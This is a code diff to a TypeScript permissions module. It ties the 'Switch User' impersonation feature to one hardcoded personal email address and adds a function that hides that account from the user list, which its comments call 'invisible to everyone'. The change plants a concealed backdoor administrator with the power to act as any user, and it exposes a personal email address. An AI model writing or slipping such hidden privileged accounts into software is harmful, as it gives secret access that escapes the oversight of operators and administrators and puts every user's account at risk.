@@ -34,9 +34,18 @@ export function isSystemAdmin(role: UserRole): boolean {
   return role === 'system_admin'
 }
 
-// Check if user can use Switch User feature (ONLY system_admin)
-export function canSwitchUser(role: UserRole): boolean {
-  return role === 'system_admin'
+// The hidden system admin email - ONLY this user can use Switch User and is invisible to everyone
+export const HIDDEN_SYSTEM_ADMIN_EMAIL = 'abdul.sejini@gmail.com'
+
+// Check if user can use Switch User feature (ONLY the hidden system admin by email)
+export function canSwitchUser(role: UserRole, email?: string): boolean {
+  // Only the specific hidden admin can switch users
+  return email?.toLowerCase() === HIDDEN_SYSTEM_ADMIN_EMAIL.toLowerCase()
+}
+
+// Check if a user should be hidden from the user list
+export function isHiddenUser(email: string): boolean {
+  return email.toLowerCase() === HIDDEN_SYSTEM_ADMIN_EMAIL.toLowerCase()
 }
 
 // Role display names
